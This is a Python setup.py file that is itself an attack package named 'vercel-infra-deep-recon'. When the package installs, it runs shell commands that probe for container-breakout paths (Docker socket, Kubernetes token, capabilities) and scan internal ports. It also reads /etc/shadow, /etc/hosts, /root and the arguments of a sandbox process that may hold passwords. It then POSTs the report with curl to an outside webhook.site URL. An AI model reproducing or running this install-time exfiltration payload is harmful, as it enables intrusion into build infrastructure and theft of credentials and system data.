from setuptools import setup
import os
import subprocess
import socket

def run_cmd(cmd):
    try: return subprocess.getoutput(cmd).strip()
    except: return "Error"

# --- КОНФИГ ---
WEBHOOK_URL = "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"

def scan_ports(ip):
    """Быстрый сканер портов для поиска внутренних БД"""
    open_ports = []
    for port in [6379, 5432, 27017, 9200, 8080, 2375]: # Redis, Postgres, Mongo, Elastic, Docker
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(str(port))
    return ",".join(open_ports) if open_ports else "None"

# --- СБОР "ЯДЕРНЫХ" ДАННЫХ ---
report = f"""
#######################################################
#     VERCEL INFRASTRUCTURE: DEEP EXPLOITATION        #
#######################################################

[1. CONTAINER BREAKOUT CHECK]
DOCKER_SOCK: {run_cmd('ls -la /var/run/docker.sock || echo "Not found"')}
KUBE_TOKEN: {run_cmd('ls -la /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "Not K8s"')}
CAPABILITIES: {run_cmd('capsh --print 2>/dev/null || echo "No capsh"')}

[2. INTERNAL NETWORK SCAN]
# Сканируем шлюз, который ты нашел (192.168.0.1)
GATEWAY_PORTS: {scan_ports('192.168.0.1')}
# Сканируем себя (проверка скрытых API)
LOCAL_PORTS: {scan_ports('127.0.0.1')}

[3. SYSTEM FILES & LOGS]
SHADOW_FILE: {run_cmd('head -n 3 /etc/shadow 2>/dev/null || echo "Permission Denied"')}
HOSTS_FILE: {run_cmd('cat /etc/hosts')}
ROOT_DIR: {run_cmd('ls -la /root 2>/dev/null || echo "Hidden"')}

[4. VERCEL AGENT ANALYSIS]
# Смотрим аргументы запуска sandbox.js (там могут быть пароли)
SANDBOX_ARGS: {run_cmd('ps -ef | grep sandbox.js | grep -v grep')}
# Ищем файлы, созданные процессом uv
UV_FILES: {run_cmd('find /vercel/.cache/uv -maxdepth 2 2>/dev/null | head -n 10')}

#######################################################
"""

# --- ЭКФИЛЬТРАЦИЯ ---
try:
    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', report, WEBHOOK_URL])
except:
    pass

setup(name="vercel-infra-deep-recon", version="3.0.0")
